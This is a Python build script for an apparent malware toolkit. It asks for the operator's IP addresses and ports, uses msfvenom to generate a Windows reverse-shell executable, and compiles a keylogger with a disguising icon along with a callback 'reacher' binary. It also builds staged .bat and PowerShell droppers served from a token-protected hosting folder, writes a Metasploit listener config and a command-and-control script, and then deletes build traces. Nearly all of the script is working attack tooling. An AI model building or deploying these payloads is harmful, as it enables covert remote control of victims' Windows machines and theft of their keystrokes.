#!/bin/python3

import os
import time
import string
import random
import getpass

def clear():
	os.system('clear')

user=getpass.getuser()
print('Running as: '+user)
if(user=='root'):
	print('Do not run script as root')
	exit()

os.system('mkdir temp')
os.system("pip3 install pyinstaller > /dev/null 2>&1")
os.system("sudo apt install wine figlet lolcat -y > /dev/null 2>&1")
os.system('sudo dpkg --add-architecture i386 && sudo apt-get update && sudo apt-get install wine32:i386 > /dev/null 2>&1')
os.system('wget -O "temp/python-install.exe" "https://www.python.org/ftp/python/3.8.9/python-3.8.9-amd64.exe" > /dev/null 2>&1')
os.system('wine temp/python-install.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0')
os.system('wine pip install pynput requests pyinstaller')

clear()
print("Output of 'curl ip.me'")
os.system('curl ip.me')
print('')
pubip=str(input('Whats your public ip? '))
clear()
print("Output of 'ip a'")
os.system('ip a')
print('')
ip=str(input('What is your private ip? '))
print("Make sure all ports specified are port forwarded\nAlso not any ports under 1025 nees escalated privilages to use\n")
port1=str(input('What port would you like to use for the reverse shell? '))
port2=str(input('What port should be used to call infected hosts back? '))
port3=str(input('What port will you host your files on? '))
clear()

print('Building...')
token=str(''.join(random.choices(string.ascii_letters, k=16)))
print("Your download token is "+token)
os.system('mkdir -p production/hosting/'+token)
os.system('echo "" > production/hosting/index.html && echo "rx3 was [x]" > production/hosting/'+token+ '/index.html')

os.system('msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST='+pubip+' LPORT='+port1+' -f exe > production/hosting/'+token+'/windows.exe')
print('reverse shell built')

#os.system('pyinstaller -F -w src/keylog.py > /dev/null 2>&1')
os.system('wine cmd /c c:/users/'+user+'/appdata/local/programs/python/python38/scripts/pyinstaller -F -i src/default.ico -w src/keylog.py')
os.system('mv dist/keylog.exe production/hosting/'+token+'/keylog.exe')
print('keylogger built')

f = open("src/call.py", "r")
temp=f.read().replace("[port]", port2)
f.close()
f = open("production/call.py", "w")
f.write(temp)
f.close()
os.system('mkdir production/empty')
print('Call script built')

f = open("src/reach.py", "r")
temp=f.read().replace("[ip]", pubip).replace("[port]", port2)
f.close()
f = open("temp/reach.py", "w")
f.write(temp)
f.close()
#os.system("pyinstaller -F -w temp/reach.py > /dev/null 2>&1")
os.system("wine cmd /c c:/users/"+user+"/appdata/local/programs/python/python38/scripts/pyinstaller -F -i src/default.ico -w temp/reach.py")
os.system("mv dist/reach.exe production/hosting/"+token+"/reach.exe")
print("Reacher built")

f = open("src/stage1.bat", "r")
temp = f.read().replace("[ip]", pubip).replace("[port]", port3).replace("[token]", token)
f.close()
f = open("production/hosting/"+token+"/stage1.bat", "w")
f.write(temp)
f.close()
print('Stage 1 built')

f = open("src/stage2.ps1", "r")
temp = f.read().replace("[ip]", pubip).replace("[port]", port3).replace("[token]", token)
f.close()
f = open("production/hosting/"+token+"/stage2.ps1", "w")
f.write(temp)
f.close()
print('Stage 2 built')

f = open("src/msf.rc", "r")
temp = f.read().replace("[ip]", ip).replace("[port]", port1)
f.close()
f = open("production/msf.rc", "w")
f.write(temp)
f.close()
print("Metasploit config built")

f = open("src/main.py", "r")
temp = f.read().replace("[port]", port3).replace("[pubip]", pubip).replace("[token]", token)
f.close()
f = open("main.py", "w")
f.write(temp)
f.close()
print("Main script built")

print('Cleaning up')
os.system('rm -r build/ dist/ keylog.spec temp/ reach.spec readme.md')
print('Script finished')
